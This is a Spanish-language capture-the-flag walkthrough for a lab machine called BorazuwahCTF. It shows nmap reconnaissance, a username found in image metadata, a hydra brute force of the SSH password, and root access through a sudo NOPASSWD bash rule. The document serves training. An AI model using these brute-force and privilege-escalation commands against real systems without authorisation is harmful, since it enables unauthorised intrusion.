# BorazuwahCTF
## 1. Reconocimiento Inicial con Nmap

Realizamos un escaneo con `nmap` para detectar puertos abiertos y sus versiones.

```bash
nmap -sC -sV --open <IP_DEL_OBJETIVO>
```

**Resultados Clave:**

*   `22/tcp open ssh OpenSSH 9.2p1 Debian`: El puerto 22 está abierto y ejecuta OpenSSH.
*   `80/tcp open http Apache httpd 2.4.59 ((Debian))`: El puerto 80 está abierto y ejecuta un servidor web Apache.

La presencia de un servidor web Apache sugiere que la interacción inicial se realizará a través de una aplicación web.

## 2. Obtención de Información de la Imagen Web

Al acceder a la dirección IP del objetivo en un navegador web, se muestra una página con una imagen de un huevo Kinder. Esto es una pista común en CTFs para buscar información oculta en la imagen.

### 2.1. Descarga de la Imagen

Primero, descargamos la imagen para poder analizarla localmente. Usamos `wget` para obtener el archivo `imagen.jpeg`.

```bash
wget http://<IP_DEL_OBJETIVO>/imagen.jpeg
```

### 2.2. Análisis con Steghide

`steghide` es una herramienta de esteganografía que permite ocultar datos dentro de archivos de imagen o audio. Intentamos extraer información oculta de la imagen.

```bash
steghide extract -sf imagen.jpeg
```

**Resultado:**

```bash
Sigue buscando, aquí no está to solución  
aunque te dejo una pista....  
sigue buscando en la imagen!!!
```
 Esto sugiere que la información no está oculta con `steghide` o que hay otra capa de ocultación.

### 2.3. Análisis de Metadatos con ExifTool

Dado que `steghide` no funcionó directamente, el siguiente paso es revisar los metadatos de la imagen. Los metadatos a menudo contienen información sobre la cámara, la fecha, la ubicación...

```bash
exiftool imagen.jpeg
```

**Resultado**

Entre la gran cantidad de metadatos, encontramos dos campos cruciales:

*   `Description: ---------- User: borazuwarah ----------`
*   `Title: ---------- Password: ----------`

Esto nos proporciona un nombre de usuario: **borazuwarah**.

## 3. Acceso Inicial (SSH)

Con el nombre de usuario `borazuwarah` y el puerto SSH (22) abierto, el siguiente paso es intentar un ataque de fuerza bruta para obtener la contraseña de SSH.

### 3.1. Fuerza Bruta con Hydra

Utilizamos `hydra` con el nombre de usuario `borazuwarah` y un diccionario de contraseñas (como `rockyou.txt`) para intentar iniciar sesión por SSH.

```bash
hydra -l borazuwarah -P /path/to/wordlist/rockyou.txt ssh://<IP_DEL_OBJETIVO>
```

**Resultado Clave:**

*   `[22][ssh] host: <IP_DEL_OBJETIVO> login: borazuwarah password: 123456`

Esto nos proporciona la contraseña para el usuario `borazuwarah`: **123456**.

### 3.2. Acceder vía SSH

Para conectarse al servidor SSH como el usuario `borazuwarah`,:
```bash
ssh borazuwarah@172.17.0.2
# contraseña: 123456
```

## 4. Escalada de Privilegios

### 4.1. Verificación de Permisos Sudo

Primero, verificamos qué comandos puede ejecutar el usuario `borazuwarah` con `sudo` sin necesidad de contraseña. Esto se hace con el comando `sudo -l`.

```bash
sudo -l
```

**Resultados Clave:**

*   `(ALL : ALL) ALL`: Esto significa que el usuario `borazuwarah` puede ejecutar cualquier comando como cualquier usuario (incluido `root`) en cualquier máquina.
*   `(ALL) NOPASSWD: /bin/bash`: Esto es aún más específico y nos indica que `borazuwarah` puede ejecutar `/bin/bash` como cualquier usuario sin necesidad de introducir su contraseña.

Esta configuración es una vulnerabilidad de escalada de privilegios directa, ya que permite al usuario `borazuwarah` obtener un shell de `root`.

### 4.2. Obtención de Shell de Root

Para obtener un shell de `root`, simplemente ejecutamos `/bin/bash` con `sudo` y especificando el usuario `root`.

```bash
sudo -u root /bin/bash
```

El comando `whoami` confirmará que hemos escalado exitosamente a `root`.

```bash
whoami
# root
```
